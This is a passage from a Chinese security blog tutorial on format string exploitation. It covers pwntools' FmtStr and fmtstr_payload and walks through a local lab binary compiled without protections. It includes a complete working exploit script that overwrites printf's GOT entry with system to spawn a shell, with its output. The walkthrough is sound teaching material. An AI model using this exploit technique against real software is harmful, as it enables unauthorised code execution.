<p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址: <code>{address1: value1, address2:value2,..., address: valueN}</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">process(cmdline).wait_for_close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">return</span> p.recvall()</span><br><span class="line"> </span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line">p = process(program, stderr=PIPE)</span><br><span class="line">addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: <span class="number">0x1337babe</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> hex(unpack(p.recv(<span class="number">4</span>)))</span><br></pre></td></tr></table></figure>

<h3 id="pwntools-pwnlib-fmtstr-模块"><a href="#pwntools-pwnlib-fmtstr-模块" class="headerlink" title="pwntools pwnlib.fmtstr 模块"></a>pwntools pwnlib.fmtstr 模块</h3><p>该模块提供了一些字符串漏洞利用的工具。该模块中定义了一个类 <code>FmtStr</code> 和一个函数 <code>fmtstr_payload</code>。</p>
<p><code>FmtStr</code> 提供了自动化的字符串漏洞利用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwnlib</span>.<span class="title">fmtstr</span>.<span class="title">FmtStr</span><span class="params">(execute_fmt, offset=None, padlen=<span class="number">0</span>, numbwritten=<span class="number">0</span>)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>execute_fmt (function)：与漏洞进程进行交互的函数</li>
<li>offset (int)：你控制的第一个格式化程序的偏移量</li>
<li>padlen (int)：在 payload 之前添加的 pad 的大小</li>
<li>numbwritten (int)：已经写入的字节数</li>
</ul>
<p><code>fmtstr_payload</code> 用于自动生成格式化字符串 payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">'byte'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>offset (int)：你控制的第一个格式化程序的偏移量</li>
<li>writes (dict)：格式为 {addr: value, addr2: value2}，用于往 addr 里写入 value 的值（常用：{printf_got}）</li>
<li>numbwritten (int)：已经由 printf 函数写入的字节数</li>
<li>write_size (str)：必须是 byte，short 或 int。告诉你是要逐 byte 写，逐 short 写还是逐 int 写（hhn，hn或n）</li>
</ul>
<p>我们通过一个例子来熟悉下该模块的使用（任意地址内存读写）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(str, <span class="string">'\0'</span>, <span class="number">1024</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, str, <span class="number">1024</span>);</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了简单一点，我们关闭 ASLR，并使用下面的命令编译，关闭 PIE，使得程序的 .text .bss 等段的内存地址固定：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">$ gcc -m32 -fno-stack-protector -no-pie fmt.c</span><br></pre></td></tr></table></figure>

<p>很明显，程序存在格式化字符串漏洞，我们的思路是将 <code>printf()</code> 函数的地址改成 <code>system()</code> 函数的地址，这样当我们再次输入 <code>/bin/sh</code> 时，就可以获得 shell 了。</p>
<p>第一步先计算偏移，虽然 pwntools 中可以很方便地构造出 exp，但这里，我们还是先演示手工方法怎么做，最后再用 pwntools 的方法。在 gdb 中，先在 <code>main</code> 处下断点，运行程序，这时 libc 已经被加载进来了。我们输入 “AAAA” 试一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ b main</span><br><span class="line">...</span><br><span class="line">gdb-peda$ r</span><br><span class="line">...</span><br><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd1f0 (&quot;AAAA\n&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f10 --&gt; 0x1</span><br><span class="line">ECX: 0xffffd1f0 (&quot;AAAA\n&quot;)</span><br><span class="line">EDX: 0x400</span><br><span class="line">ESI: 0xf7f97000 --&gt; 0x1bbd90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd5f8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd1e0 --&gt; 0xffffd1f0 (&quot;AAAA\n&quot;)</span><br><span class="line">EIP: 0x8048512 (&lt;main+92&gt;:      call   0x8048370 &lt;printf@plt&gt;)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048508 &lt;main+82&gt;: sub    esp,0xc</span><br><span class="line">   0x804850b &lt;main+85&gt;: lea    eax,[ebp-0x408]</span><br><span class="line">   0x8048511 &lt;main+91&gt;: push   eax</span><br><span class="line">&#x3D;&gt; 0x8048512 &lt;main+92&gt;: call   0x8048370 &lt;printf@plt&gt;</span><br><span class="line">   0x8048517 &lt;main+97&gt;: add    esp,0x10</span><br><span class="line">   0x804851a &lt;main+100&gt;:        mov    eax,DWORD PTR [ebx-0x4]</span><br><span class="line">   0x8048520 &lt;main+106&gt;:        mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x8048522 &lt;main+108&gt;:        sub    esp,0xc</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0xffffd1f0 (&quot;AAAA\n&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd1e0 --&gt; 0xffffd1f0 (&quot;AAAA\n&quot;)</span><br><span class="line">0004| 0xffffd1e4 --&gt; 0xffffd1f0 (&quot;AAAA\n&quot;)</span><br><span class="line">0008| 0xffffd1e8 --&gt; 0x400</span><br><span class="line">0012| 0xffffd1ec --&gt; 0x80484d0 (&lt;main+26&gt;:      add    ebx,0x1b30)</span><br><span class="line">0016| 0xffffd1f0 (&quot;AAAA\n&quot;)</span><br><span class="line">0020| 0xffffd1f4 --&gt; 0xa (&#39;\n&#39;)</span><br><span class="line">0024| 0xffffd1f8 --&gt; 0x0</span><br><span class="line">0028| 0xffffd1fc --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048512 in main ()</span><br></pre></td></tr></table></figure>

<p>我们看到输入 <code>printf()</code> 的变量 <code>arg[0]: 0xffffd1f0 (&quot;AAAA\n&quot;)</code> 在栈的第 5 行，除去第一个格式化字符串，即偏移量为 4。</p>
<p>读取重定位表获得 <code>printf()</code> 的 GOT 地址（第一列 Offset）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r a.out</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.dyn'</span> at offset 0x2f4 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ff8  00000406 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">08049ffc  00000706 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.plt'</span> at offset 0x304 contains 5 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">0804a014  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a01c  00000607 R_386_JUMP_SLOT   00000000   memset@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<p>在 gdb 中获得 <code>printf()</code> 的虚拟地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p printf</span><br><span class="line">$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e26bf0 &lt;printf&gt;</span><br></pre></td></tr></table></figure>

<p>获得 <code>system()</code> 的虚拟地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p system</span><br><span class="line">$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e17060 &lt;system&gt;</span><br></pre></td></tr></table></figure>

<p>好了，演示完怎样用手工的方式得到构造 exp 需要的信息，下面我们给出使用 pwntools 构造的完整漏洞利用代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./a.out'</span>)</span><br><span class="line">r = process(<span class="string">'./a.out'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/usr/lib32/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算偏移量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = process(<span class="string">'./a.out'</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    info = r.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line">offset = auto.offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 printf 的 GOT 地址</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">log.success(<span class="string">"printf_got =&gt; &#123;&#125;"</span>.format(hex(printf_got)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 printf 的虚拟地址</span></span><br><span class="line">payload = p32(printf_got) + <span class="string">'%&#123;&#125;$s'</span>.format(offset)</span><br><span class="line">r.send(payload)</span><br><span class="line">printf_addr = u32(r.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">log.success(<span class="string">"printf_addr =&gt; &#123;&#125;"</span>.format(hex(printf_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 system 的虚拟地址</span></span><br><span class="line">system_addr = printf_addr - (libc.symbols[<span class="string">'printf'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">log.success(<span class="string">"system_addr =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got : system_addr&#125;)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">'/bin/sh'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ python2 exp.py</span><br><span class="line">[*] <span class="string">'/home/firmy/Desktop/RE4B/a.out'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./a.out'</span>: pid 17375</span><br><span class="line">[*] <span class="string">'/usr/lib32/libc.so.6'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Found format string offset: 4</span><br><span class="line">[+] printf_got =&gt; 0x804a010</span><br><span class="line">[+] printf_addr =&gt; 0xf7e26bf0</span><br><span class="line">[+] system_addr =&gt; 0xf7e17060</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"hacked!"</span></span><br><span class="line">hacked!</span><br></pre></td></tr></table></figure>

<p>这样我们就获得了 shell，可以看到输出的信息和我们手工得到的信息完全相同。</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Format/">https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Format/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/OIP-C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Heap/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN入门到入狱-Heap</div></div></a></div><div class="next-post pull-right"><a href="/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Stack/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN入门到入狱-Stack</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2022-05/pwn题如何配置和靶机一样的环境/" title="pwn题如何配置和靶机一样的环境"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-27</div><div class="relatedPosts_title">pwn题如何配置和靶机一样的环境</div></div></a></div><div class="relatedPosts_item"><a href="/2022-05/从0开始的pwn题环境配置/" title="从0开始的pwn题环境配置"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-27</div><div class="relatedPosts_title">从0开始的pwn题环境配置</div></div></a></div><div class="relatedPosts_item"><a href="/2022-04/PWN入门到入狱-Code/" title="PWN入门到入狱-Code"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-15</div><div class="relatedPosts_title">PWN入门到入狱-Code</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Integer/" title="PWN入门到入狱-Integer"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Integer</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Heap/" title="PWN入门到入狱-Heap"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Heap</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Stack/" title="PWN入门到入狱-Stack"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Stack</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>